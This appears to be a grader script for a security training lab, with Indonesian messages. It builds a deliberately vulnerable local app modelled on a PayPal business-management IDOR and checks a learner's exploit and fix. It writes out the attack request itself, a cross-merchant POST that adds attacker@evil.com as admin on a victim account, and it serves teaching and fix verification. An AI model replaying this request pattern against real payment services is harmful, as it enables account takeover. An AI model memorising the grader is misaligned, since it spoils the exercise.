#!/usr/bin/env python3
"""Verifier Lab 28: PayPal IDOR -> cross-merchant privilege escalation."""

import json
import os
import subprocess
import sys
import time
from http.client import HTTPConnection

LAB = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
passed, failed = 0, 0

ATTACKER = ("attacker@evil.com", "attacker_pw")
OWN, VICTIM = "acct_1001", "acct_1002"


def check(name, cond, got=""):
    global passed, failed
    if cond:
        passed += 1
        print("  [LULUS] %s -- dapat %s" % (name, got))
    else:
        failed += 1
        print("  [GAGAL] %s -- dapat %s" % (name, got))


def sh(cmd):
    return subprocess.run(cmd, cwd=LAB, capture_output=True, text=True, timeout=300)


def req(method, path, body=None, token=None):
    c = HTTPConnection(HOST, PORT, timeout=10)
    h = {}
    if token:
        h["Authorization"] = "Bearer " + token
    c.request(method, path,
              body=json.dumps(body).encode() if body else None, headers=h)
    r = c.getresponse()
    raw = r.read()
    try:
        data = json.loads(raw or b"{}")
    except Exception:
        data = {}
    c.close()
    return r.status, data


def wait_ready(timeout=90):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            s, _ = req("GET", "/")
            if s == 200:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def login(email, password):
    s, d = req("POST", "/login", {"email": email, "password": password})
    return d.get("token", "") if s == 200 else ""


def parse_contract(out):
    d = {}
    for line in out.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            d[k.strip()] = v.strip()
    return d


def run_exploit(path):
    p = subprocess.run([sys.executable, path], capture_output=True,
                       text=True, timeout=120)
    return p.returncode, p.stdout, p.stderr


def state_proves_escalation():
    """Verifikasi independen: attacker@evil.com tercantum admin di acct_1002."""
    tok = login(*ATTACKER)
    if not tok:
        return False
    s, d = req("GET", "/businessmanage/users?account_id=" + VICTIM, token=tok)
    return s == 200 and any(u.get("email") == ATTACKER[0]
                            and u.get("role") == "admin" for u in d)


def contract_ok(d):
    if d.get("STATUS") != "201":
        return False, "STATUS=%r" % d.get("STATUS")
    if d.get("TARGET") != VICTIM:
        return False, "TARGET=%r (harus akun korban)" % d.get("TARGET")
    if d.get("ADDED") != ATTACKER[0] or d.get("ROLE") != "admin":
        return False, "ADDED/ROLE=%r/%r" % (d.get("ADDED"), d.get("ROLE"))
    if not state_proves_escalation():
        return False, "tidak terbukti di state server"
    return True, "admin tertanam di %s" % VICTIM


def fase1():
    print("== FASE 1: membangun lab PRISTINE (rentan) ==")
    sh(["docker", "compose", "down"])
    sh(["docker", "compose", "up", "--build", "-d"])
    print("menunggu lab siap di 127.0.0.1:8080 ...")
    if not wait_ready():
        check("lab siap", False, "timeout")
        return
    tok = login(*ATTACKER)
    check("baseline: login attacker -> token", bool(tok), "token" if tok else "gagal")
    s, d = req("GET", "/businessmanage/merchants", token=tok)
    check("baseline: direktori merchant -> 200 + acct_1002",
          s == 200 and any(m["id"] == VICTIM for m in d), s)
    s, d = req("GET", "/businessmanage/users?account_id=" + OWN, token=tok)
    check("baseline: baca akun sendiri -> 200", s == 200, s)
    s, d = req("GET", "/businessmanage/users?account_id=" + VICTIM, token=tok)
    check("baseline: baca akun korban -> 403 (read dijaga)", s == 403, s)
    s, d = req("POST", "/businessmanage/users/api/v1/users",
               {"account_id": OWN, "email": "alice@tokoberkah.com",
                "role": "member"}, token=tok)
    check("baseline: tambah-user akun sendiri -> 201", s == 201, s)

    print("== [HEALTH] serangan referensi: IDOR tambah-user lintas merchant ==")
    rc, out, err = run_exploit(os.path.join(LAB, "solutions", "exploit.py"))
    d = parse_contract(out)
    ok, got = contract_ok(d) if rc == 0 else (False, "rc=%d" % rc)
    check("serangan referensi: kontrak STATUS/TARGET/ADDED/ROLE", ok, got)

    print("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    p = os.path.join(LAB, "exploit", "exploit.py")
    try:
        src = open(p).read()
    except FileNotFoundError:
        src = ""
    if "NotImplementedError" in src:
        check("exploit: sudah dikerjakan (bukan scaffold)", False, "masih scaffold")
        return
    rc, out, err = run_exploit(p)
    d = parse_contract(out)
    check("exploit: STATUS 201", d.get("STATUS") == "201", repr(d.get("STATUS")))
    check("exploit: TARGET adalah akun korban (bukan milik sendiri)",
          d.get("TARGET") == VICTIM, repr(d.get("TARGET")))
    ok, got = contract_ok(d) if rc == 0 else (False, "rc=%d" % rc)
    check("exploit: eskalasi terbukti di state server", ok, got)


def fase2():
    print("== FASE 2: cek scaffold fix ==")
    pristine = open(os.path.join(LAB, "app", "app.py"), "rb").read()
    fixed = open(os.path.join(LAB, "fix", "app", "app.py"), "rb").read()
    check("fix: fix/app/app.py sudah diubah (tidak identik pristine)",
          pristine != fixed, "identik" if pristine == fixed else "berbeda")
    if pristine == fixed:
        return
    print("== FASE 2: membangun lab dengan FIX ==")
    sh(["docker", "compose", "-f", "docker-compose.yml",
        "-f", "docker-compose.fix.yml", "up", "--build", "-d"])
    print("menunggu lab siap di 127.0.0.1:8080 ...")
    if not wait_ready():
        check("lab siap", False, "timeout")
        return
    tok = login(*ATTACKER)
    s, d = req("POST", "/businessmanage/users/api/v1/users",
               {"account_id": VICTIM, "email": ATTACKER[0], "role": "admin"},
               token=tok)
    check("serangan referensi GAGAL: lintas merchant -> 403", s == 403, s)
    check("serangan referensi GAGAL: tidak tertanam",
          not state_proves_escalation(), "tertancap?" )
    s, d = req("POST", "/businessmanage/users/api/v1/users",
               {"account_id": OWN, "email": "alice@tokoberkah.com",
                "role": "member"}, token=tok)
    check("fungsi normal: akun sendiri tetap 201", s == 201, s)
    s, d = req("GET", "/businessmanage/users?account_id=" + VICTIM, token=tok)
    check("fungsi normal: baca akun korban tetap 403", s == 403, s)
    print("== FASE 2: menjalankan serangan referensi terhadap fix ==")
    rc, out, err = run_exploit(os.path.join(LAB, "solutions", "exploit.py"))
    d = parse_contract(out)
    ok, _ = contract_ok(d)
    check("serangan referensi GAGAL total (tidak ada kontrak valid)",
          rc != 0 or not ok, "rc=%d" % rc)


if __name__ == "__main__":
    fase1()
    fase2()
    print("== HASIL: %d/%d cek lulus ==" % (passed, passed + failed))
    sh(["docker", "compose", "down"])
    sys.exit(0 if failed == 0 else 1)
